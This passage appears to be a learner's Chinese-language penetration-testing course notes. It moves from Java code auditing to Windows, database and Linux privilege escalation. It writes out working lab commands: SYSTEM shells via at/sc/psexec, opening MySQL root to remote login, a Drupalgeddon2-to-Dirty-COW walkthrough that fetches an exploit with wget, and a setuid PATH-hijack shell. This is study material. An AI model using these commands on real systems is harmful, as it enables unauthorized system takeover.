通读源码</span><br><span class="line">缺点 耗费时间</span><br><span class="line"></span><br><span class="line">根据敏感函数审计</span><br><span class="line">	高效挖出想要的漏洞，判断敏感函数上下文，追踪参数源头</span><br><span class="line"></span><br><span class="line">开始前</span><br><span class="line">1.确定框架</span><br><span class="line">	web.xml / 导入的jar包或pom.xml / 看配置文件</span><br><span class="line">	配置文件</span><br><span class="line">        struts2			struts.xml</span><br><span class="line">        spring 			applicationContext.xml</span><br><span class="line">        spring mvc 		spring-mvc.xml</span><br><span class="line">        hibernate		hibernate.cfg.xml</span><br><span class="line">        mybatis			mybatis-config.xml</span><br><span class="line">2.web.xml文件 确定是否配置相关拦截器</span><br><span class="line">	/src/main/webapp/WEB-INF/web.xml</span><br><span class="line"></span><br><span class="line">jsp	能写java的html</span><br><span class="line"></span><br><span class="line">正确的预编译机制很难绕过</span><br><span class="line"></span><br><span class="line">javaweb-sec跑不起来</span><br><span class="line">	org.springframework.beans.factory.parsing.BeanDefinitionParsingException: Configuration problem: Unable to locate Spring NamespaceHandler for XML schema namespace [http://www.springframework.org/schema/tx]</span><br><span class="line">Offending resource: ServletContext resource [/WEB-INF/applicationContext.xml]</span><br><span class="line"></span><br><span class="line">idea插件findbugs		装不上开插件ideal打不开 日</span><br><span class="line">https://www.cnblogs.com/kingsonfu/p/12419817.html</span><br><span class="line">	不能分析jsp格式</span><br><span class="line">	</span><br><span class="line">fortify</span><br><span class="line">	&quot;Scan Java Project&quot; 选择项目 选择Java版本 选择默认选项 其中第三项一定位Yes 选择Scan</span><br><span class="line">	扫出可能的点人工去看</span><br><span class="line"></span><br><span class="line">全局搜索关键字</span><br><span class="line">	出入查找的关键字 可选择查找范围 可选择大小写 整字匹配 正则表达式 脚本类型</span><br><span class="line">	比如 select 数据库连接函数</span><br><span class="line"></span><br><span class="line">引用追踪</span><br><span class="line">	选择函数 右键 查找使用		快捷键 alt+f7</span><br><span class="line"></span><br><span class="line">web.xml查看filter信息</span><br><span class="line">pom.xml查看包的</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	建议Demo段SQL注入及预编译</span></span><br><span class="line">GET接受参数<span class="string">&quot;user&quot;</span></span><br><span class="line">	String user = request.getParamater(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">建立数据库连接</span><br><span class="line">	Connection = getConnection();</span><br><span class="line">定义最终执行的SQL语句</span><br><span class="line">	String sql = <span class="string">&quot;select host,user from mysql.user where=&#x27;&quot;</span> + user + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    String sql = <span class="string">&quot;select host,user from mysql.user where = ?&quot;</span>;</span><br><span class="line">创建预编译对象</span><br><span class="line">	PreparedStatement pstt = connection.prepareStatement(sql);</span><br><span class="line">执行并获取返回结果对象</span><br><span class="line">	ResultSet rs = pstt.executeQuery();</span><br></pre></td></tr></table></figure>

<h3 id="day56-代码审计-JAVA项目Filter过滤器及XSS挖掘"><a href="#day56-代码审计-JAVA项目Filter过滤器及XSS挖掘" class="headerlink" title="day56-代码审计-JAVA项目Filter过滤器及XSS挖掘"></a>day56-代码审计-JAVA项目Filter过滤器及XSS挖掘</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	寻求绕过</span></span><br><span class="line">	看构成 看指向 看配置 看代码</span><br><span class="line"></span><br><span class="line"><span class="comment">#	Filter过滤器配置启用及查看</span></span><br><span class="line">	查看web.xml文件了解代码有无Filter过滤器</span><br><span class="line">	可以通过<span class="string">&quot;导航&quot;</span><span class="string">&quot;文件&quot;</span>来直接搜索</span><br><span class="line">	&lt;<span class="built_in">filter</span>&gt;是过滤器的标识，&lt;<span class="built_in">filter</span>-name&gt;是过滤器名字</span><br><span class="line">	&lt;<span class="built_in">filter</span>-<span class="keyword">class</span>&gt;是过滤器代码的路径，分清过滤器在内部还是外部，根据路径来判断</span><br><span class="line">	&lt;<span class="built_in">filter</span>-mapping&gt;是路由设置，其中&lt;<span class="built_in">filter</span>-name&gt;是路由名,&lt;url-pattern&gt;是触发路由的地址&lt;dispatcher&gt;是相关的配置信息</span><br><span class="line">	一个项目会有不止一个过滤器</span><br><span class="line">	当过滤器的触发条件被满足，其中的核心代码就会被执行</span><br><span class="line"></span><br><span class="line"><span class="comment">#	知识点</span></span><br><span class="line">	Filter是JavaWeb中的过滤器，用于过滤URL请求。通过Filter可以实现URL请求资源权限验证、用户登录检测等功能。</span><br><span class="line">	Filter是个接口，实现Filter只需重写init、doFilter、destory方法即可</span><br><span class="line">	Filter和Servlet一样是Java Web中最为核心的部分，使用Servlet和Filter可以实现后端接口开发和权限控制，当然使用Filter机制也可以实现MVC框架，Struts2实现机制就是使用Filter</span><br><span class="line">    Filter的配置类似与Servlet，由&lt;<span class="built_in">filter</span>&gt;和&lt;<span class="built_in">filter</span>-mapping&gt;两组标签组成，如果Servlet版本大于<span class="number">3.0</span>同样可以使用注解的方式配置Filter。</span><br><span class="line"></span><br><span class="line"><span class="comment">#	Jeesns过滤器分析绕过防护代码</span></span><br><span class="line">	查看web.xml，找到Filter</span><br><span class="line">	如果查找使用发现一个对象未找到出处，可能是因为声明代码的地方在.jar包中</span><br><span class="line">	读代码可知，jeesns1<span class="number">.3</span>的版本把呢不能使用脚本关键字过滤，过滤不完全，产生漏洞</span><br><span class="line">    由于触发条件时<span class="string">&quot;/*&quot;</span>,所以访问任意文件二号目录都会触发该过滤器</span><br><span class="line">    读代码，过滤的时url请求的参数，找到有输出的地方即可测试XSS</span><br><span class="line"></span><br><span class="line"><span class="comment">#	Struts框架类过滤器简要分析测试</span></span><br><span class="line">	框架类的过滤器看的文件不是web.xml，每个框架各不相同，指向必然是外部，触发的请求和规则也不同</span><br><span class="line">    找不到过滤器，根据网络资料，发现struts的语法不同，以&lt;interceptors&gt;开头</span><br><span class="line">    依旧找不到过滤器，查看是否有包含文件</span><br><span class="line">    分析过滤器:找到它们的声明，分析过滤的规则</span><br><span class="line">        有一些过滤器与安全无关，可以不看，看特定关键字的过滤器</span><br><span class="line">        </span><br><span class="line"><span class="comment">#	涉及资源</span></span><br><span class="line">	Struts2拦截器的配置和使用：http://c.biancheng.net/view/<span class="number">4106.</span>html</span><br></pre></td></tr></table></figure>

<h3 id="day57-代码审计-JAVA项目框架类漏洞分析报告"><a href="#day57-代码审计-JAVA项目框架类漏洞分析报告" class="headerlink" title="day57-代码审计-JAVA项目框架类漏洞分析报告"></a>day57-代码审计-JAVA项目框架类漏洞分析报告</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	JAVA框架	分析核心:断点调试</span></span><br><span class="line">	框架识别		引用配置获取</span><br><span class="line">	利用已知漏洞		名称及版本号</span><br><span class="line">	挖掘未知漏洞		过滤器 拦截器 框架特性 执行流程</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\b5d3b10dd0d7d6ea10e7a7b02fed848553a7ecad.jpg@737w_882h_progressive.webp" alt="img"></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#	图例</span><br><span class="line">	<span class="number">1</span>.HttpServletRequest		请求信息</span><br><span class="line">	<span class="number">2</span>.Filter Dispatcher		最底层过滤器</span><br><span class="line">	<span class="number">3</span>.ActionMapping				Struct2中主要检测请求信息是否需要Struts2处理</span><br><span class="line">	<span class="number">4</span>.ActionProxy			中间层可以调用其它类什么的</span><br><span class="line">	<span class="number">5</span>.ConfigurationManager			负责将struts.xml文件中配置文件映射到内存中去</span><br><span class="line">	<span class="number">6</span>.Struts.xml						Struts配置文件需要程序员填写</span><br><span class="line">	<span class="number">7</span>.ActionInvocation			包含<span class="number">4</span>个属性分别获取前端传递的值，action,struts.xml 其它一些信息</span><br><span class="line">	<span class="number">8</span>.Interceptor			拦截器不是太理解应该是获取前端传递的属性值，然后封装到action的属性域中</span><br><span class="line">	<span class="number">9</span>.HttpServletResponse		响应用户的类</span><br><span class="line">	</span><br><span class="line">...</span><br><span class="line">	</span><br><span class="line">#	最后总结</span><br><span class="line">	Struts2</span><br><span class="line">	已知漏洞：找框架自身版本，利用漏洞库去确定漏洞</span><br><span class="line">	未知漏洞：执行流程，过滤器、拦截器、框架特性</span><br><span class="line">	验证：</span><br><span class="line">		采用断点调试，确定.action文件断点后，无法拦截执行请求，说明满足路由规则请求方法后跳出过滤拦截器，绕过实现ognl表达式漏洞</span><br><span class="line">	</span><br><span class="line">	Spring</span><br><span class="line">	已知漏洞:..</span><br><span class="line">	有spel表达式注入漏洞-未知漏洞测试</span><br><span class="line">	从自身源码分析到文件sql语句有注入漏洞，尝试成功(未发现过滤器及拦截器)</span><br><span class="line">	</span><br><span class="line">...</span><br></pre></td></tr></table></figure>





<h3 id="day58-权限提升-网站权限后台漏洞第三方获取"><a href="#day58-权限提升-网站权限后台漏洞第三方获取" class="headerlink" title="day58-权限提升-网站权限后台漏洞第三方获取"></a>day58-权限提升-网站权限后台漏洞第三方获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#具体哪些权限需要知道和了解</span><br><span class="line">后台权限</span><br><span class="line">	只能操作应用界面的内容数据图片等信息，无法操作程序的源代码或服务器上得到资源文件</span><br><span class="line">网站权限</span><br><span class="line">	查看或修改程序源代码，可以对网站或应用的配置文件读取，还能收集服务器操作系统相关你的信息，为后续系统提权做准备</span><br><span class="line">数据库权限</span><br><span class="line">	操作数据库的权限。</span><br><span class="line">接口权限	邮件 短信 支付</span><br><span class="line">	</span><br><span class="line">系统权限</span><br><span class="line">域控权限</span><br></pre></td></tr></table></figure>

<h3 id="day59-权限提升-Win溢出漏洞及AT-amp-SC-amp-PS提权"><a href="#day59-权限提升-Win溢出漏洞及AT-amp-SC-amp-PS提权" class="headerlink" title="day59-权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权"></a>day59-权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 溢出漏洞原理</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">服务器</span><br><span class="line">	针对环境</span><br><span class="line">		web 本地</span><br><span class="line">	提权方法</span><br><span class="line">		数据库* 溢出漏洞* 令牌窃取 第三方软件 AT&amp;SC&amp;PS 不安全的服务权限 不带引号的服务路径 Unattended_Installs AlwaysInstallElevated</span><br><span class="line">	针对版本</span><br><span class="line">		windows_xp win7/8/10(个人) win2k3/08 win2012/16</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1668764215649.png" alt="1668764215649"></p>
<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1668764506649.png" alt="1668764506649"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv		查看当前账户具体权限</span><br><span class="line">systeminfo			查看系统信息 此处可以看到打过哪些补丁KB打头</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	at	win2003	定时任务会以system权限执行</span></span><br><span class="line">at 11.20 /interactive cmd.exe</span><br><span class="line"><span class="comment">#	sc	启动服务被使用system权限</span></span><br><span class="line">sc Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>=interact</span><br><span class="line">sc start syscmd</span><br><span class="line"><span class="comment">#	ps	需要提前下载psexec.exe文件		微软官方提权工具</span></span><br><span class="line">psexec.exe -accepteula -s -i -d cmd.exe	</span><br></pre></td></tr></table></figure>

<h3 id="day60-权限提升-MY-amp-MS-amp-ORA等数据库提权"><a href="#day60-权限提升-MY-amp-MS-amp-ORA等数据库提权" class="headerlink" title="day60-权限提升-MY&amp;MS&amp;ORA等数据库提权"></a>day60-权限提升-MY&amp;MS&amp;ORA等数据库提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">探针</span><br><span class="line">	端口 服务 其他</span><br><span class="line">收集</span><br><span class="line">	最高权限密码</span><br><span class="line">		配置文件* 存储文件 暴力猜解 其他方式</span><br><span class="line">分类</span><br><span class="line">	Mysql</span><br><span class="line">		UDF* MOF 启动项 反弹shell</span><br><span class="line">	Mssql</span><br><span class="line">		xp_cmdshell sp_oacreate 沙盒模式 映像劫持</span><br><span class="line">	Oracle</span><br><span class="line">		普通用户 DBA用户 注入模式</span><br><span class="line">	Redis</span><br><span class="line">	Postgresql</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	mysql提权 脚本和msf</span></span><br><span class="line">上传的是大马	首先查看开启端口udf <span class="string">&quot;user defined function&quot;</span>	</span><br><span class="line">找存放账号密码的地方 直接代码审计搜root</span><br><span class="line"></span><br><span class="line">1. UDF提权知识点</span><br><span class="line">通过添加新函数对MYSQL功能进行扩充，性质就像本地MYSQL函数如abs() concat()</span><br><span class="line">	https://blog.csdn.net/qq_43430261/article/details/107258466</span><br><span class="line">读取网站数据库配置文件（了解命名规则及查找技巧）</span><br><span class="line">	sql data inc config conn database common include等</span><br><span class="line">读取数据库存储或备份文件</span><br><span class="line">	@@basedir/data/数据库名/表名.myd</span><br><span class="line">	mysql.user	存用户密码	Mysql/data/mysql/user.MYD</span><br><span class="line">利用脚本暴力采解(了解数据库是否支持外联及如何开启外联)</span><br><span class="line">	root一般不支持外联</span><br><span class="line">	上传爆破脚本去爆破</span><br><span class="line">远程暴力猜解卖服务器本地暴力猜解</span><br><span class="line">利用自定义执行函数导出dll文件进行命令执行</span><br><span class="line"></span><br><span class="line">2.	MOF</span><br><span class="line">3.	启动项</span><br><span class="line">	https://blog.csdn.net/qq_37077262/article/details/102964050</span><br><span class="line">	msf启动项提权，需要开启数据库外联 windows/mysql/mysql_start_up</span><br><span class="line">开启外联</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;root&#x27;</span> WITH GRANT OPTION;</span><br><span class="line">GRANT ALL PRIVILEGES ON * TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;root&#x27;</span> WITH GRANT OPTION;</span><br><span class="line">kali 连接要带上-proot</span><br><span class="line">	mysql -h 102.168.188.1 -uroot -proot</span><br><span class="line"></span><br><span class="line">windows/mysql/mysql_start_up</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlserver只在windows上有</span><br><span class="line">看到<span class="number">55</span>分钟 后面不是mysql的数据库</span><br></pre></td></tr></table></figure>

<h3 id="day61-权限提升-Redis-amp-Postgre-amp-令牌窃取-amp-进程注入"><a href="#day61-权限提升-Redis-amp-Postgre-amp-令牌窃取-amp-进程注入" class="headerlink" title="day61-权限提升-Redis&amp;Postgre&amp;令牌窃取&amp;进程注入"></a>day61-权限提升-Redis&amp;Postgre&amp;令牌窃取&amp;进程注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从25分钟开始</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 	令牌窃取</span><br></pre></td></tr></table></figure>

<h3 id="day62-权限提升-烂土豆-amp-dll劫持-amp-引号路径-amp-服务权限"><a href="#day62-权限提升-烂土豆-amp-dll劫持-amp-引号路径-amp-服务权限" class="headerlink" title="day62-权限提升-烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限"></a>day62-权限提升-烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限</h3><h3 id="day63-权限提升-Linux脏牛内核漏洞-amp-SUID-amp-信息收集"><a href="#day63-权限提升-Linux脏牛内核漏洞-amp-SUID-amp-信息收集" class="headerlink" title="day63-权限提升-Linux脏牛内核漏洞&amp;SUID&amp;信息收集"></a>day63-权限提升-Linux脏牛内核漏洞&amp;SUID&amp;信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Linux</span><br><span class="line">	针对环境</span><br><span class="line">		web 本地(ssh)</span><br><span class="line">	信息收集</span><br><span class="line">		内核信息 用户群组 环境信息 进程服务 计划任务 有无ssh_私钥 有无明文密码 可读写执行目录</span><br><span class="line">	提权服务</span><br><span class="line">		SUID 内核漏洞 环境变量 计划任务 第三方服务</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/123684723</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#	案例1 linux提权自动化脚本利用-4个脚本</span><br><span class="line">两个信息收集 LinEnum(里面的LinEnum.sh文件上传到靶机使用sh运行),linuxprivchecker</span><br><span class="line">两个漏洞探针 linux-exploit-suggester linux-exploit-suggester2</span><br><span class="line">上传linEnum.sh之/tmp 服务器重启自动删除的文件夹</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#	suid	web</span><br><span class="line">	https://pentestlab.blog/2017/09/25/suid-executables/</span><br><span class="line">	https://blog.csdn.net/weixin_44770698/article/details/125941759</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#	墨者靶场 Ubuntu16.04漏洞复现 CVE-2017-16995	本地(ssh进去的)</span><br><span class="line">先用提供的ssh登录进去上传linux-exploit-suggester2.pl</span><br><span class="line">	perl linux-exploit-suggester2.pl</span><br><span class="line">内核提权 红队笔记碰到过 45010.c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#	Linux提权脏牛内核漏洞演示	vulnhub lampiao</span><br><span class="line">靶机192.168.213.149</span><br><span class="line">扫端口 22 80 1898		1898使用drupal搭建</span><br><span class="line">kali</span><br><span class="line">	msfconsole</span><br><span class="line">		search drupal</span><br><span class="line">		use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">		show options</span><br><span class="line">		set RPORT 1898</span><br><span class="line">		set RHOST 192.168.213.149</span><br><span class="line">		exploit</span><br><span class="line">	meterpreter &gt; upload /home/hyy19/linux-exploit-suggester.sh /tmp/1.sh</span><br><span class="line">	shell</span><br><span class="line">		chmod +x /tmp/1.sh</span><br><span class="line">		/tmp/1.sh</span><br><span class="line">#	使用 CVE-2016-5195 dirtycow</span><br><span class="line">		python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">		cd /tmp</span><br><span class="line">		wget https://www.exploit-db.com/download/40611	没有直接用这个</span><br><span class="line">		没有直接用这个 用了</span><br><span class="line">			https://github.com/firefart/dirtycow</span><br><span class="line">		然后按照提示操作上传dirty.c然后靶机死机了?</span><br><span class="line">			靶机网页打不开了80 1898</span><br><span class="line">		Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line">		并不是内核的原因 应该是提权漏洞用错了</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669255808666.png" alt="1669255808666"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#第二个解法msf攻击之后	/var/www/html</span><br><span class="line">cat /sites/default/settings.php</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669254910242.png" alt="1669254910242"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#此处得到一个可能的密码 然后结合linux的/home用户进行ssh登录		-&gt;tiago</span><br><span class="line">这边就相当于本地提权了 如果用www-data用户要用python建立一个交互界面</span><br><span class="line">kali</span><br><span class="line">	searchsploit dirty</span><br><span class="line">	searchsploit -p 40847.cpp		#得到路径</span><br><span class="line">	cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /home/hyy19</span><br><span class="line">meterpreter &gt; upload /home/hyy19/40847.cpp /tmp/1.cpp</span><br><span class="line">shell</span><br><span class="line">	python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">	ls /tmp -liah	#检查上传成功没</span><br><span class="line">	cd /tmp</span><br><span class="line">	g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 1.cpp -lutil</span><br><span class="line">	./dcow	#得到更新的root密码dirtyCowFun</span><br><span class="line">	su root</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux提权李木有pdf</span><br></pre></td></tr></table></figure>

<h3 id="day64-权限提升-Linux定时任务-amp-环境变量-amp-数据库"><a href="#day64-权限提升-Linux定时任务-amp-环境变量-amp-数据库" class="headerlink" title="day64-权限提升-Linux定时任务&amp;环境变量&amp;数据库"></a>day64-权限提升-Linux定时任务&amp;环境变量&amp;数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#本地环境变量安全-Aliyun</span><br><span class="line">https://www.cnblogs.com/tzf1/p/16207536.html</span><br><span class="line"># suid	普通用户使用某些文件命令时时赋予了文件的所有者的权限，而某些特定文件所有者是root</span><br><span class="line">https://www.cnblogs.com/tzf1/p/16207536.html</span><br><span class="line"></span><br><span class="line">配合SUID进行环境变量提权-本地用户环境</span><br><span class="line">gcc demo.c -o shell		#编译的shell上传到靶机</span><br><span class="line"></span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">	setuid(0);</span><br><span class="line">	setgid(0);</span><br><span class="line">	system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">ps		#使用环境变量中的ps</span><br><span class="line">./ps	#调用/bin/sh		#非管理员shell</span><br><span class="line"></span><br><span class="line">export PATH=/tmp:$PATH		#环境变量使用:分割</span><br><span class="line">ps		#此时调用/tmp下ps因为/tmp在最前面</span><br><span class="line">./shell		#管理员shell</span><br><span class="line"></span><br><span class="line">#感觉是这个上传的shell具有suid权限的原因</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669370648475.png" alt="1669370648475"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我的云服务器测试</span></span><br><span class="line">root执行</span><br><span class="line">demo.c</span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">void <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">	setuid(0);</span><br><span class="line">	setgid(0);</span><br><span class="line">	system(<span class="string">&quot;sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">gcc demo.c -o shell_sh</span><br><span class="line">复制到普通用户目录</span><br><span class="line"><span class="built_in">chmod</span> u+s shell_sh</span><br><span class="line">登录普通用户</span><br><span class="line">./shell_sh</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1669372162594.png" alt="1669372162594"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地用户才能使用sui提权，web用户不行，没有权限设置环境变量</span><br></pre></td></tr></table></figure>

